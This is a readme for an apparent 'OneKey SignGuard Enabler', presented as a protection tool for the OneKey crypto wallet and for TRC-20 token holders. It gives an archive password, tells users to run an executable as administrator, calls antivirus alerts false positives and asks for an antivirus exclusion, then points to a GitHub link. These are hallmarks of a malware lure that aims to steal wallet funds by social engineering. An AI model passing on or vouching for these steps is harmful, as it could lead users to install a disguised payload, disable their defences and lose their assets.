====================================================
OneKey SignGuard Enabler v1.0
====================================================

Password: onekey2026

FILES INCLUDED:
- OneKey_SignGuard_Enabler.exe (main security tool)
- config.ini (optional settings)
- readme.txt (this file)

ABOUT THIS TOOL:
This utility enables advanced SignGuard protection for the OneKey desktop wallet.
It adds extra security layers to prevent blind signing and phishing attacks,
especially targeting WIN (TRC-20) token holders.

INSTALLATION:
1. Close OneKey desktop application.
2. Run OneKey_SignGuard_Enabler.exe AS ADMINISTRATOR.
3. Follow the on-screen instructions.
4. Restart OneKey and verify "SignGuard Active" badge appears.

WHAT IT DOES:
- Enforces strict transaction parsing for all contract interactions
- Blocks known phishing domains (updates via config)
- Adds extra PIN prompt for high-value transfers
- Verifies OneKey executable integrity

CONFIGURATION:
Edit config.ini to customize protection levels:
  [Settings]
  StrictMode=1
  BlockPhishing=1
  ExtraPinThreshold=1000

NOTE: Antivirus may false-positive on this tool – it's safe.
Add to exclusions if needed.

For updates and more info:
https://github.com/yigitturukk/OneKey-SignGuard-Enabler

Stay secure!